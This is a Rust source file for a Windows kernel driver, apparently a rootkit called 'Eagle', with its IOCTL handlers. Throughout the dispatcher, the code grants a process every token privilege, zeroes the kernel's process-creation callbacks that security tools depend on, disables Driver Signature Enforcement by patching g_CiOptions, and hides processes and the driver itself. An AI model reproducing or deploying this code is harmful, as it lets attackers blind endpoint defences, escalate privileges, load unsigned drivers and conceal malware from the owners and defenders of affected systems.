#![no_std]
#![feature(alloc_c_string)]
#![feature(core_c_str)]


mod string;
mod process;
mod token;
mod callbacks;
pub mod includes;
mod dse;


use core::{panic::PanicInfo, mem::{size_of}};
use core::ptr::null_mut;
use dse::get_gci_options_address;
use kernel_alloc::nt::ExFreePool;
use winapi::{km::wdm::IO_PRIORITY::IO_NO_INCREMENT, shared::ntstatus::{STATUS_BUFFER_TOO_SMALL, STATUS_INVALID_PARAMETER}};
use winapi::km::wdm::{DRIVER_OBJECT, IoCreateDevice, PDEVICE_OBJECT, IoCreateSymbolicLink, IRP_MJ, DEVICE_OBJECT, IRP, IoCompleteRequest, IoGetCurrentIrpStackLocation, IoDeleteSymbolicLink, IoDeleteDevice, DEVICE_TYPE};
use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING, FALSE, NT_SUCCESS, TRUE};
use winapi::shared::ntstatus::{STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, IOCTL_PROCESS_HIDE_REQUEST, IOCTL_DRIVER_HIDE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement, IOCTL_DRIVER_ENUM_REQUEST, ModuleInformation};
use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::{find_psp_set_create_process_notify, hide::{hide_process, hide_driver, get_kernel_loaded_modules}}};
use crate::process::{protect_process, unprotect_process};
use crate::string::create_unicode_string;
use crate::token::enable_all_token_privileges;
extern crate alloc;
use kernel_log::KernelLogger;
use log::{LevelFilter};


/// When using the alloc crate it seems like it does some unwinding. Adding this
/// export satisfies the compiler but may introduce undefined behaviour when a
/// panic occurs.
#[no_mangle]
pub extern "system" fn __CxxFrameHandler3(_: *mut u8, _: *mut u8, _: *mut u8, _: *mut u8) -> i32 { unimplemented!() }

#[global_allocator]
static GLOBAL: kernel_alloc::KernelAlloc = kernel_alloc::KernelAlloc;

/// Explanation can be found here: https://github.com/Trantect/win_driver_example/issues/4
#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

#[no_mangle]
pub extern "system" fn driver_entry(driver: &mut DRIVER_OBJECT, _: &UNICODE_STRING) -> NTSTATUS {
    KernelLogger::init(LevelFilter::Info).expect("Failed to initialize logger");

    log::info!("Driver Entry called");

    driver.DriverUnload = Some(driver_unload);

    driver.MajorFunction[IRP_MJ::CREATE as usize] = Some(dispatch_create_close);
    driver.MajorFunction[IRP_MJ::CLOSE as usize] = Some(dispatch_create_close);
    driver.MajorFunction[IRP_MJ::DEVICE_CONTROL as usize] = Some(dispatch_device_control);

    let device_name = create_unicode_string(obfstr::wide!("\\Device\\Eagle\0"));
    let mut device_object: PDEVICE_OBJECT = null_mut();
    let mut status = unsafe { 
        IoCreateDevice(
            driver,
            0,
            &device_name,
            DEVICE_TYPE::FILE_DEVICE_UNKNOWN,
            0,
            FALSE, 
            &mut device_object
        ) 
    };

    if !NT_SUCCESS(status) {
        log::error!("Failed to create device object ({:#x})", status);
        return status;
    }

    let symbolic_link = create_unicode_string(obfstr::wide!("\\??\\Eagle\0"));
    status = unsafe { IoCreateSymbolicLink(&symbolic_link, &device_name) };

    if !NT_SUCCESS(status) {
        log::error!("Failed to create symbolic link ({:#x})", status);
        return status;
    }

    //ProcessNotify (called when a process is created)
    unsafe { PsSetCreateProcessNotifyRoutineEx(process_create_callback as PcreateProcessNotifyRoutineEx, FALSE) };


    return STATUS_SUCCESS;
}


pub extern "system" fn dispatch_device_control(device_object: &mut DEVICE_OBJECT, irp: &mut IRP) -> NTSTATUS {
    
    let stack = IoGetCurrentIrpStackLocation(irp);
    let control_code = unsafe { (*stack).Parameters.DeviceIoControl().IoControlCode };
    let mut status = STATUS_SUCCESS;
    let mut information: usize = 0;

    match control_code {
        IOCTL_PROCESS_PROTECT_REQUEST => {
            log::info!("IOCTL_PROCESS_PROTECT_REQUEST");

            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetProcess>() as u32 } {
                status = STATUS_BUFFER_TOO_SMALL;
                log::error!("STATUS_BUFFER_TOO_SMALL");
                return complete_request(irp, status, information);
            }

            let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };
            let protect_process_status = protect_process(target_process);
           
            if NT_SUCCESS(protect_process_status) {
                log::info!("Process protection successful");
                information = size_of::<TargetProcess>();
                status = STATUS_SUCCESS;
            } else {
                log::error!("Process protection failed");
                status = STATUS_UNSUCCESSFUL;
            }
        },
        IOCTL_PROCESS_UNPROTECT_REQUEST => {
            log::info!("IOCTL_PROCESS_UNPROTECT_REQUEST");

            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetProcess>() as u32 } {
                status = STATUS_BUFFER_TOO_SMALL;
                log::error!("STATUS_BUFFER_TOO_SMALL");
                return complete_request(irp, status, information);
            }

            let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };
            let unprotect_process_status = unprotect_process(target_process);
           
            if NT_SUCCESS(unprotect_process_status) {
                log::info!("Process unprotection successful");
                information = size_of::<TargetProcess>();
                status = STATUS_SUCCESS;
            } else {
                log::error!("Process unprotection failed");
                status = STATUS_UNSUCCESSFUL;
            }
        },
        IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST => {
            log::info!("IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST");

            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetProcess>() as u32 } {
                status = STATUS_BUFFER_TOO_SMALL;
                log::error!("STATUS_BUFFER_TOO_SMALL");
                return complete_request(irp, status, information);
            }

            let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };
            let token_privs_status = enable_all_token_privileges(target_process);
           
            if NT_SUCCESS(token_privs_status) {
                log::info!("Process token privileges successful");
                information = size_of::<TargetProcess>();
                status = STATUS_SUCCESS;
            } else {
                log::error!("Process token privileges failed");
                status = STATUS_UNSUCCESSFUL;
            }
        },
        IOCTL_CALLBACKS_ENUM_REQUEST => {
            log::info!("IOCTL_PROCESS_ENUM_CALLBACKS");

            let (modules, number_of_modules) = get_loaded_modules().expect("[-] Failed to get loaded modules");
            let psp_array_address = find_psp_set_create_process_notify().expect("[-] Failed to find PspSetCreateProcessNotifyRoutine array address");

            let user_buffer = irp.UserBuffer as *mut CallBackInformation;
            
            for i in 0..64 {
                let p_callback = unsafe { psp_array_address.cast::<u8>().offset(i * 8) };
                let callback = unsafe { *(p_callback as *const u64) };
                unsafe { (*user_buffer.offset(i)).pointer = callback };

                if callback > 0 {
                    let callback_info = unsafe { user_buffer.offset(i) };
                    search_loaded_modules(modules, number_of_modules, callback_info);
                    information += size_of::<CallBackInformation>();
                }
            }

            log::info!("Enumerate callbacks successful");
            unsafe { ExFreePool(modules as u64) };
            status = STATUS_SUCCESS;
        },
        IOCTL_CALLBACKS_ZERO_REQUEST => {
            log::info!("IOCTL_CALLBACKS_ZERO_REQUEST");

            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetCallback>() as u32 } {
                status = STATUS_BUFFER_TOO_SMALL;
                log::error!("STATUS_BUFFER_TOO_SMALL");
                return complete_request(irp, status, information);
            }

            let target = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetCallback };

            if target.is_null() {
                status = STATUS_INVALID_PARAMETER;
                log::error!("STATUS_INVALID_PARAMETER");
                return complete_request(irp, status, information);
            }
            
            if unsafe { (*target).index < 0 || (*target).index > 64 } {
                status = STATUS_INVALID_PARAMETER;
                log::error!("STATUS_INVALID_PARAMETER");
                return complete_request(irp, status, information);
            }

            let psp_array_address = find_psp_set_create_process_notify().expect("[-] Failed to find PspSetCreateProcessNotifyRoutine array address");

            for i in 0..64 { 
                if i == unsafe { (*target).index } {
                    let p_callback = unsafe { psp_array_address.cast::<u8>().offset((i * 8) as isize) };
                    unsafe { *(p_callback as *mut u64) = 0 as u64 }; // Zero out the callback index
                    information = size_of::<TargetCallback>();
                    status = STATUS_SUCCESS;
                    break;             
                }
            }
            log::info!("IOCTL_CALLBACKS_ZERO_REQUEST successful");
        },
        IOCTL_DSE_ENABLE_DISABLE_REQUEST => {
            log::info!("IOCTL_DSE_ENABLE_DISABLE_REQUEST");

            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<DriverSignatureEnforcement>() as u32 } {
                status = STATUS_BUFFER_TOO_SMALL;
                log::error!("STATUS_BUFFER_TOO_SMALL");
                return complete_request(irp, status, information);
            }

            if unsafe { (*stack).Parameters.DeviceIoControl().OutputBufferLength < size_of::<DriverSignatureEnforcement>() as u32 } {
                status = STATUS_BUFFER_TOO_SMALL;
                log::error!("STATUS_BUFFER_TOO_SMALL");
                return complete_request(irp, status, information);
            }

            let dse = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut DriverSignatureEnforcement };
            let user_buffer = irp.UserBuffer as *mut DriverSignatureEnforcement;

            if dse.is_null() {
                status = STATUS_INVALID_PARAMETER;
                log::error!("STATUS_INVALID_PARAMETER");
                return complete_request(irp, status, information);
            }

            let g_ci_option_address = get_gci_options_address().expect("Unable to get g_CiOptions address");

            if unsafe { (*dse).is_enabled } {
                unsafe { *(g_ci_option_address as *mut u64) = 0x0006 as u64 }; // Enable DSE
                unsafe { (*user_buffer).address = *(g_ci_option_address as *mut u64) };
                unsafe { (*user_buffer).is_enabled = true };
            } else {
                unsafe { *(g_ci_option_address as *mut u64) = 0x000E as u64 }; // Disble DSE
                unsafe { (*user_buffer).address = *(g_ci_option_address as *mut u64) };
                unsafe { (*user_buffer).is_enabled = false };
            }

            log::info!("IOCTL_DSE_ENABLE_DISABLE_REQUEST successful");

            information = size_of::<DriverSignatureEnforcement>();
            status = STATUS_SUCCESS;
        },
        IOCTL_PROCESS_HIDE_REQUEST => {
            log::info!("IOCTL_PROCESS_HIDE_REQUEST");

            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetProcess>() as u32 } {
                status = STATUS_BUFFER_TOO_SMALL;
                log::error!("STATUS_BUFFER_TOO_SMALL");
                return complete_request(irp, status, information);
            }

            let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };

            let process_id = unsafe { (*target_process).process_id };
            log::info!("Process ID: {:?}", process_id);

            if let Ok(_result) = hide_process(process_id) {
                log::info!("Hide process successful");
                information = size_of::<TargetProcess>();
                status = STATUS_SUCCESS;
            } else {
                log::error!("Hide process failed");
                status = STATUS_UNSUCCESSFUL;
            }
        },
        IOCTL_DRIVER_HIDE_REQUEST => {
            log::info!("IOCTL_DRIVER_HIDE_REQUEST");
           
            if let Ok(_result) = hide_driver(device_object) {
                log::info!("Driver hidden successful");
                information = 0;
                status = STATUS_SUCCESS;
            } else {
                log::error!("Failed to hide driver");
                status = STATUS_UNSUCCESSFUL;
            }
        },
        IOCTL_DRIVER_ENUM_REQUEST => {
            log::info!("IOCTL_DRIVER_ENUM_REQUEST");

            let user_buffer = irp.UserBuffer as *mut ModuleInformation;
            
            if let Ok(_result) = get_kernel_loaded_modules(user_buffer, &mut information) {
                log::info!("Loaded modules enumerate successfully");
                status = STATUS_SUCCESS;
            } else {
                log::error!("Failed enumerate modules");
                status = STATUS_UNSUCCESSFUL;
            }
        },
        _ => {
            log::error!("Invalid IOCTL code");
            status = STATUS_UNSUCCESSFUL;
        },
    }

    return complete_request(irp, status, information);
}

fn complete_request(irp: &mut IRP, status: NTSTATUS, information: usize) -> NTSTATUS {
    unsafe { *(irp.IoStatus.__bindgen_anon_1.Status_mut()) = status };
    irp.IoStatus.Information = information;
    unsafe { IoCompleteRequest(irp, IO_NO_INCREMENT) };

    return status;
}

pub extern "system" fn dispatch_create_close(_device_object: &mut DEVICE_OBJECT, irp: &mut IRP) -> NTSTATUS {
    let stack = IoGetCurrentIrpStackLocation(irp);
    let code = unsafe { (*stack).MajorFunction };

	if code == IRP_MJ::CREATE as u8 {
		log::info!("IRP_MJ_CREATE called");
	} else {
		log::info!("IRP_MJ_CLOSE called");
	}
	
    irp.IoStatus.Information = 0;
    unsafe { *(irp.IoStatus.__bindgen_anon_1.Status_mut()) = STATUS_SUCCESS };

    unsafe { IoCompleteRequest(irp, IO_NO_INCREMENT) };
    
    return STATUS_SUCCESS;
}

pub extern "system" fn driver_unload(driver: &mut DRIVER_OBJECT) {
    let symbolic_link = create_unicode_string(obfstr::wide!("\\??\\Eagle\0"));
    unsafe { IoDeleteSymbolicLink(&symbolic_link) };
    unsafe { IoDeleteDevice(driver.DeviceObject) };

    // Remove Callbacks (or BSOD)
    unsafe { PsSetCreateProcessNotifyRoutineEx(process_create_callback as PcreateProcessNotifyRoutineEx, TRUE) };
    log::info!("Driver unloaded successfully!");
}